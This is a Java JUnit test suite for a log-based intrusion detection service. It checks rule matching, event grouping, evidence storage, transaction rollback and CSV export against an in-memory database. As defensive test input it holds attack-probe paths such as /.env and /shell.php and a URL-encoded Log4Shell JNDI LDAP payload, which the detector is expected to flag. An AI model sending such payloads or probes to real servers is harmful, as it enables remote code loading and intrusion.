package com.csys.logdetector.detection;

import com.csys.logdetector.detection.service.DetectionService;
import com.csys.logdetector.detection.engine.DetectionEngine;

import com.csys.logdetector.common.BizException;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.jdbc.datasource.DriverManagerDataSource;
import java.sql.Timestamp;
import java.time.LocalDateTime;
import java.util.List;
import java.util.Map;
import static org.junit.jupiter.api.Assertions.*;

/** SQL and aggregation integration against H2 MySQL mode; not a substitute for MySQL acceptance. */
class DetectionServiceDatabaseTest {
    JdbcTemplate db;
    DetectionService service;
    com.csys.logdetector.detection.mapper.DetectionMapper mapper;
    @BeforeEach void setup() {
        var ds = new DriverManagerDataSource("jdbc:h2:mem:" + java.util.UUID.randomUUID() + ";MODE=MySQL;DB_CLOSE_DELAY=-1", "sa", "");
        db = new JdbcTemplate(ds);
        db.execute("CREATE TABLE import_batch(id BIGINT PRIMARY KEY)");
        db.execute("CREATE TABLE detection_batch(batch_id BIGINT PRIMARY KEY REFERENCES import_batch(id))");
        db.execute("CREATE TABLE log_entry(id BIGINT PRIMARY KEY, batch_id BIGINT, client_ip_hash VARCHAR(64), client_ip_mask VARCHAR(64), log_time TIMESTAMP, method VARCHAR(16), path VARCHAR(1024), query_string VARCHAR(1024), status_code INT, user_agent VARCHAR(1024), raw_line_masked VARCHAR(1024), parse_status VARCHAR(16))");
        db.execute("CREATE TABLE rule_definition(rule_code VARCHAR(16) PRIMARY KEY, rule_name VARCHAR(128), category VARCHAR(32), default_severity VARCHAR(16), description VARCHAR(512))");
        db.execute("CREATE TABLE event(id BIGINT AUTO_INCREMENT PRIMARY KEY, client_ip_hash VARCHAR(64), client_ip_mask VARCHAR(64), window_start TIMESTAMP, window_end TIMESTAMP, risk_score DECIMAL(5,2), severity VARCHAR(16), status VARCHAR(24))");
        db.execute("CREATE TABLE rule_hit(id BIGINT AUTO_INCREMENT PRIMARY KEY, log_entry_id BIGINT, rule_code VARCHAR(16), matched_field VARCHAR(32), evidence_snippet VARCHAR(1024), severity VARCHAR(16), hit_time TIMESTAMP)");
        db.execute("CREATE TABLE event_evidence(id BIGINT AUTO_INCREMENT PRIMARY KEY, event_id BIGINT, rule_hit_id BIGINT, is_primary INT)");
        db.update("INSERT INTO import_batch VALUES (1)");
        try {
            var factory = new org.mybatis.spring.SqlSessionFactoryBean();
            factory.setDataSource(ds);
            factory.setMapperLocations(new org.springframework.core.io.ClassPathResource("mapper/DetectionMapper.xml"));
            mapper = new org.mybatis.spring.SqlSessionTemplate(factory.getObject()).getMapper(com.csys.logdetector.detection.mapper.DetectionMapper.class);
        } catch (Exception e) { throw new IllegalStateException(e); }
        service = new DetectionService(mapper, new DetectionEngine(12, 8));
    }
    void log(int id, String ip, int minute, String path) {
        db.update("INSERT INTO log_entry VALUES (?,1,?,?,?,'GET',?,NULL,200,'Mozilla','masked line','SUCCESS')", id, ip, ip + ".***", Timestamp.valueOf(LocalDateTime.of(2025,1,1,0,0).plusMinutes(minute)), path);
    }
    @Test void storesEventsAndEvidenceWithWindowAndIpIsolation() {
        log(1,"a",0,"/.env"); log(2,"a",10,"/.env"); log(3,"a",11,"/.env"); log(4,"b",0,"/.env");
        Map<String,Object> result = service.detect(1);
        assertEquals(4, result.get("hitCount")); assertEquals(3, result.get("eventCount"));
        List<Map<String,Object>> events = service.events();
        assertEquals(3, events.size());
        Map<String,Object> grouped = events.stream().filter(e -> ((Number)e.get("logCount")).intValue() == 2).findFirst().orElseThrow();
        assertEquals(List.of("R9"), grouped.get("ruleCodes"));
        Map<String,Object> detail = service.event(((Number) grouped.get("id")).longValue());
        List<?> evidence = (List<?>) detail.get("evidence");
        assertEquals(2, evidence.size());
        assertEquals("masked line", ((Map<?,?>)evidence.get(0)).get("rawLineMasked"));
        assertThrows(BizException.class, () -> service.detect(1));
        assertThrows(BizException.class, () -> service.event(999));
    }
    @Test void queryEvidenceAndGitConfigSurvivePersistenceAndEventRead() {
        log(1, "a", 0, "/.git/config");
        log(2, "a", 1, "/search");
        String query = "q=%24%7Bjndi%3Aldap%3A%2F%2Fhost%7D";
        db.update("UPDATE log_entry SET query_string=? WHERE id=2", query);
        assertEquals(2, service.detect(1).get("hitCount"));
        var event = service.events().get(0);
        var evidence = (List<?>) service.event(((Number) event.get("id")).longValue()).get("evidence");
        assertEquals(2, evidence.size());
        var git = (Map<?, ?>) evidence.get(0);
        assertEquals("R9", git.get("ruleCode"));
        assertEquals("path", git.get("matchedField"));
        assertEquals("/.git/config", git.get("evidenceSnippet"));
        var jndi = (Map<?, ?>) evidence.get(1);
        assertEquals("R10", jndi.get("ruleCode"));
        assertEquals("url_or_user_agent", jndi.get("matchedField"));
        assertEquals("/search?" + query + " Mozilla", jndi.get("evidenceSnippet"));
        assertEquals("CRITICAL", jndi.get("severity"));
    }
    @Test void newRulesPersistAndAreIncludedInEvents() {
        service = new DetectionService(mapper, new DetectionEngine(12, 8, 3));
        log(1, "a", 0, "/shell.php");
        log(2, "a", 0, "/login");
        log(3, "a", 0, "/");
        db.update("UPDATE log_entry SET method='TRACE', query_string='password=[REDACTED]' WHERE id=2");
        service.detect(1);
        assertEquals(15, db.queryForObject("SELECT COUNT(*) FROM rule_definition", Integer.class));
        assertEquals(List.of("R11", "R12", "R13", "R14"),
                db.queryForList("SELECT DISTINCT rule_code FROM rule_hit ORDER BY rule_code", String.class));
        assertEquals(3, db.queryForObject("SELECT COUNT(*) FROM rule_hit WHERE rule_code='R14'", Integer.class));
        assertEquals(List.of("R11", "R12", "R13", "R14"), service.events().get(0).get("ruleCodes"));
    }
    @Test void batchedEvidenceFailureRollsBackEntireDetection() {
        for (int i = 1; i <= 501; i++) log(i, "a", 0, "/.env");
        db.execute("ALTER TABLE event_evidence ADD CONSTRAINT reject_last_hit CHECK (rule_hit_id < 501)");
        var tx = new org.springframework.transaction.support.TransactionTemplate(
                new org.springframework.jdbc.datasource.DataSourceTransactionManager(db.getDataSource()));
        assertThrows(org.springframework.dao.DataAccessException.class, () -> tx.execute(status -> service.detect(1)));
        for (String table : List.of("event", "rule_hit", "event_evidence", "detection_batch", "rule_definition"))
            assertEquals(0, db.queryForObject("SELECT COUNT(*) FROM " + table, Integer.class), table);
        assertEquals(501, db.queryForObject("SELECT COUNT(*) FROM log_entry", Integer.class));
    }
    @Test void batchFilterUsesEvidenceWithoutChangingAggregatesOrDuplicatingCsvRows() {
        db.execute("CREATE TABLE audit_log(id BIGINT AUTO_INCREMENT PRIMARY KEY, actor_user_id BIGINT, action VARCHAR(32), target_type VARCHAR(32), target_id VARCHAR(64), trace_id VARCHAR(64))");
        db.update("INSERT INTO event VALUES (1,'a','a.***',CURRENT_TIMESTAMP,CURRENT_TIMESTAMP,80,'HIGH','NEW'), (2,'b','b.***',CURRENT_TIMESTAMP,CURRENT_TIMESTAMP,50,'LOW','NEW'), (3,'c','c.***',CURRENT_TIMESTAMP,CURRENT_TIMESTAMP,10,'LOW','NEW')");
        log(1, "a", 0, "/"); log(2, "a", 0, "/"); log(3, "a", 0, "/"); log(4, "b", 0, "/");
        db.update("UPDATE log_entry SET batch_id=2 WHERE id IN (3,4)");
        db.update("INSERT INTO rule_hit(id,log_entry_id,rule_code) VALUES (1,1,'R1'),(2,2,'R1'),(3,3,'R2'),(4,4,'R3')");
        db.update("INSERT INTO event_evidence(event_id,rule_hit_id,is_primary) VALUES (1,1,1),(1,2,0),(1,3,0),(2,4,1)");
        var filtered = service.events(1L);
        assertEquals(1, filtered.size());
        assertEquals(1L, filtered.get(0).get("id"));
        assertEquals(3L, filtered.get(0).get("hitCount"));
        assertEquals(3L, filtered.get(0).get("logCount"));
        assertEquals(List.of("R1", "R2"), filtered.get(0).get("ruleCodes"));
        assertEquals(2, service.events(2L).size());
        assertEquals(2, service.events().size());
        assertTrue(service.events(999L).isEmpty());
        var workflowMapper = EventAnalysisTestMapperFactory.create(db.getDataSource(), com.csys.logdetector.detection.mapper.EventWorkflowMapper.class, "EventWorkflowMapper.xml");
        var workflow = new com.csys.logdetector.detection.service.EventWorkflowService(workflowMapper, service, new com.csys.logdetector.log.sanitizer.LogSanitizer(), null);
        String csv = workflow.csv(7, 1L);
        assertEquals(2, csv.lines().count());
        assertTrue(csv.contains("\"1\",\"a.***\""));
        assertFalse(csv.contains("b.***"));
        assertFalse(csv.contains("c.***"));
        assertEquals(3, workflow.csv(7, 2L).lines().count());
        assertEquals(4, workflow.csv(7).lines().count());
        assertEquals(1, workflow.csv(7, 999L).lines().count());
        assertEquals(4, db.queryForObject("SELECT COUNT(*) FROM audit_log WHERE action='EVENT_CSV_EXPORT'", Integer.class));
    }
    @Test void emptyBatchIsMarkedAndCannotBeRepeated() {
        assertEquals(0, service.detect(1).get("hitCount"));
        assertThrows(BizException.class, () -> service.detect(1));
    }
}
